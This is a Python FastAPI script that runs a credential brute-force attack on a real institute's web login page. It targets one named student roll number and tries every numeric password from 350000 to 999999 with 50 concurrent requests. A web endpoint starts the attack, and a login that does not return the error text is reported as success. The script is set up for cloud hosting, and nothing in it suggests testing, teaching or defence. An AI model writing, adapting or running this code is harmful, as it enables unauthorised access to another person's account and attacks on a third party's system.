from fastapi import FastAPI
import asyncio
import aiohttp
import os

app = FastAPI()

URL = "https://app.biomeinstitute.in/weblogin/"
ROLL = "25002833"
THREADS = 50  # Adjust as needed
running_task = None


async def try_password(session, password):
    payload = {
        "sublogin": "1",
        "username": ROLL,
        "password": str(password),
        "Login": "Secure Login"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    async with session.post(URL, data=payload, headers=headers) as response:
        text = await response.text()
        if "Invalid your username and password" not in text:
            print(f"SUCCESS! Roll: {ROLL}  Password: {password}")
            return True
    return False


async def main_bruteforce():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for password in range(350000, 999999):
            task = asyncio.create_task(try_password(session, password))
            tasks.append(task)

            if len(tasks) >= THREADS:
                results = await asyncio.gather(*tasks)
                if any(results):
                    break
                tasks.clear()


@app.get("/")
async def root():
    return {"status": "Service running. Trigger with /start"}


@app.get("/start")
async def start_task():
    global running_task
    if running_task and not running_task.done():
        return {"status": "Brute force already running"}
    running_task = asyncio.create_task(main_bruteforce())
    return {"status": "Brute force started"}


# ENTRY POINT for Render
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
